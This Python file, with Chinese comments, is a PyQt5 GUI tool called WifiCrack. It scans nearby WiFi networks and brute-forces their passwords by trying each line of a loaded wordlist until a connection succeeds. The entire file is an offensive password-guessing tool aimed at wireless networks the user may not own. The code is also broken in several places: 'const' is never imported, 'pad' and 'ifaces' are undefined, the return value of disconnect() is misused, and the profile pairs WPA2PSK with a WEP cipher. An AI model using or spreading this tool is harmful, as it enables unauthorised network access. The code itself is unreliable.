from PyQt5.QtWidgets import QWidget, QApplication, QFileDialog
from PyQt5.QtCore import QStringListModel
from PyQt5.uic import loadUi
import sys
import pywifi
import time

class WifiCrack(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.wifi=pywifi.PyWiFi()
        self.ifaces=[]
        self.pwdPaths=[]
        self.wifis=[]
        self.currentIfaceIdx=-1
        self.currentWifi=""
        self.pwdFiles=[]
        self.currentPwdFile=""

    def initUI(self):
        loadUi('wifiCrack.ui', self)
        self.scanBtn.clicked.connect(self.scanWifi)
        self.loadWifiInterfaceBtn.clicked.connect(self.loadWifiInterfaces)
        self.wifiInterfaceList.clicked.connect(self.selectIface)
        self.scanBtn.clicked.connect(self.scanWifi)
        self.wifiList.clicked.connect(self.selectWifi)
        self.loadPwdFileBtn.clicked.connect(self.loadPwdFiles)
        self.startCrackBtn.clicked.connect(self.crackWifi)

    def crackWifi(self):
        print("start cracking:")
        print(self.currentPwdFile)
        with open(self.currentPwdFile, 'r') as file:
        #file=open(self.currentPwdFile, "r")
            while True:
                #一行一行读取
                pwd=file.readline()
                print(pwd)
                bConnected=self.wifiConnect(pwd)
                
                if bConnected:
                    print("密码已破解： ",pwd)
                    print("WiFi已自动连接！！！")
                    break
                else:
                    #跳出当前循环，进行下一次循环
                    print("密码破解中....密码校对: ",pad)

    def wifiConnect(self, pwd):
        print(self.ifaces)
        iface=self.ifaces[self.currentIfaceIdx].disconnect()
        print(iface)
        time.sleep(1)
        wifistatus=iface.status()
        if wifistatus==const.IFACE_DISCONNECTED:
            #创建WiFi连接文件
            profile=pywifi.Profile()
            #要连接WiFi的名称
            profile.ssid=self.currentWifi
            print(profile.ssid)
            #网卡的开放状态
            profile.auth=const.AUTH_ALG_OPEN
            #wifi加密算法,一般wifi加密算法为wps
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            #加密单元
            profile.cipher=const.CIPHER_TYPE_WEP
            #调用密码
            profile.key=pwd
            #删除所有连接过的wifi文件
            iface.remove_all_network_profiles()
            #设定新的连接文件
            tep_profile=iface.add_network_profile(profile)
            iface.connect(tep_profile)
            #wifi连接时间
            time.sleep(3)
            if ifaces.status()==const.IFACE_CONNECTED:
                return True
            else:
                return False
        else:
            print("已有wifi连接") 

    def scanWifi(self):
        iface=self.ifaces[1]
        iface.scan()
        bsses=iface.scan_results()
        self.wifis=bsses
        data=[]
        for bss in bsses:
            #print(bss.ssid, bss.bssid, bss.signal)
            data.append(str(bss.ssid) + ' ' + str(bss.bssid) + " " + str(bss.signal))
        slm=QStringListModel(data)
        self.wifiList.setModel(slm)

    def loadPwdFiles(self):
        self.pwdFiles, ok=QFileDialog.getOpenFileNames(self, 'select files', '', 'txt files(*.txt)')
        print(self.pwdFiles)
        slm=QStringListModel(self.pwdFiles)
        self.passwordFileList.setModel(slm)
        self.passwordFileList.clicked.connect(self.selectPwdFile)

    def selectPwdFile(self, index):
        self.currentPwdFile=self.pwdFiles[index.row()]
        print(self.currentPwdFile)

    def selectWifi(self, index):
        self.currentWifi=self.wifis[index.row()].ssid
        print(self.currentWifi)
    
    def loadWifiInterfaces(self):
        self.ifaces = self.wifi.interfaces()
        data=[]
        for iface in self.ifaces:
            data.append(iface.name())
        slm=QStringListModel(data)
        self.wifiInterfaceList.setModel(slm)

    def selectIface(self, index):
        self.currentIfaceIdx=index.row()
        print(self.currentIfaceIdx)

if __name__ == '__main__':
    app=QApplication(sys.argv)
    w=WifiCrack()
    w.resize(600, 400)
    w.show()
    sys.exit(app.exec_())
